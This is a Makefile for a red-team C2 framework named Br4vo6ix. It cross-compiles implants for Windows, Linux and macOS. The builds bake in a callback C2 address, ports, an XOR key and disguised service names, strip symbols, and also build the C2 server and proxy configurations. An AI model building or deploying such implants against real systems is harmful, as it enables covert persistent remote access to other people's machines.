include .env

## install: Install all the dependencies
install:
	go get ./...

## win64: Compiles the Br4vo6ix implant for Windows x64
win64:
	GOOS=windows GOARCH=amd64 go build -ldflags="-X 'main.REMOTE_IP=$(C2_IP)' -X 'main.PORTS=$(PORTS)' -X 'main.XOR_KEY=$(XOR_KEY)' -X 'main.SRV_NAME=$(WINDOWS_SRV_NAME)' -X 'main.SRV_DSP_NAME=$(WINDOWS_SRV_NAME)' -X 'main.SRV_DESC=$(WINDOWS_SRV_DESC)' -s -w" -o $(WINDOWS_OUT_FILE) implant/main.go

## linux64: Compiles the Br4vo6ix implant for Linux x64
linux64:
	GOOS=linux GOARCH=amd64 go build -ldflags="-X 'main.REMOTE_IP=$(C2_IP)' -X 'main.PORTS=$(PORTS)' -X 'main.XOR_KEY=$(XOR_KEY)' -X 'main.SRV_NAME=$(LINUX_SRV_NAME)' -X 'main.SRV_DSP_NAME=$(LINUX_SRV_NAME)' -X 'main.SRV_DESC=$(LINUX_SRV_DESC)' -s -w" -o $(LINUX_OUT_FILE) implant/main.go

## mac64: Compiles the Br4vo6ix implant for MacOS x64
mac64:
	GOOS=darwin GOARCH=amd64 go build -ldflags="-X 'main.REMOTE_IP=$(C2_IP)' -X 'main.PORTS=$(PORTS)' -X 'main.XOR_KEY=$(XOR_KEY)' -X 'main.SRV_NAME=$(MAC_SRV_NAME)' -X 'main.SRV_DSP_NAME=$(MAC_SRV_NAME)' -X 'main.SRV_DESC=$(MAC_SRV_DESC)' -s -w" -o $(MACOS_OUT_FILE) implant/main.go

## c2: Compiles the Br4vo6ix C2 for use on THIS host
c2:
	go build -o out/server/server server/main.go

## proxy: Generates the config files to run on each proxy server
proxy:
	PORTS=$(PORTS) REDTEAM_IPS=$(REDTEAM_IPS) PROXY_IP=$(PROXY_IP) ./proxy.sh
	PORTS=$(PORTS) REDTEAM_IPS=$(REDTEAM_IPS) PROXY_IP=$(PROXY_IP) ./unproxy.sh

## all: Compiles the Br4vo6ix implant for all platforms and the C2 for the current host
all: win64 linux64 mac64 c2